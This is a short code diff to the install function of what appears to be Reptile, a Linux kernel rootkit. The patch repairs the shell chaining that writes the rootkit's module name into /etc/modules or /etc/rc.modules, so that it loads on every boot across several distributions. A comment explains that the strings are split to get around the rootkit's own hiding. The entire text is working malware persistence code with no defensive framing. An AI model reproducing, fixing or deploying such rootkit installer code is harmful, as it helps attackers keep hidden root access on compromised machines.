@@ -127,17 +127,17 @@ function reptile_install {
     
     	if [ "$SYSTEM" == "debian" ] || [ "$SYSTEM" == "ubuntu" ]; then
 		# we have to break these strings, cause when Reptile is loaded, this script may fail to remove
-        	echo -ne "#<rep" >> /etc/modules \  
-		echo -ne "tile>\nreptile\n#</rep" >> /etc/modules \
+        	echo -ne "#<rep" >> /etc/modules && \  
+		echo -ne "tile>\nreptile\n#</rep" >> /etc/modules && \
 		echo -ne "tile>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     	elif [ "$SYSTEM" == "redhat" ] || [ "$SYSTEM" == "centos" ] || [ "$SYSTEM" == "fedora" ]; then
-        	echo -ne "#<rep" >> /etc/rc.modules \
-		echo -ne "tile>\nreptile\n#</rep" >> /etc/rc.modules \
-		echo -ne "tile>" >> /etc/rc.modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
+        	echo -ne "#<rep" >> /etc/rc.modules && \
+		echo -ne "tile>\nreptile\n#</rep" >> /etc/rc.modules && \
+		echo -ne "tile>" >> /etc/rc.modules && \
 		chmod +x /etc/rc.modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
 	#elif [ "$SYSTEM" == "arch" ]; then
-        #	echo -ne "#<rep" >> /etc/modules \
-	#	echo -ne "tile>\nreptile\n#</rep" >> /etc/modules \
+        #	echo -ne "#<rep" >> /etc/modules && \
+	#	echo -ne "tile>\nreptile\n#</rep" >> /etc/modules && \
 	#	echo -ne "tile>" >> /etc/modules || { echo -e "\e[01;31mERROR!\e[00m\n"; exit; }
     	fi
     	
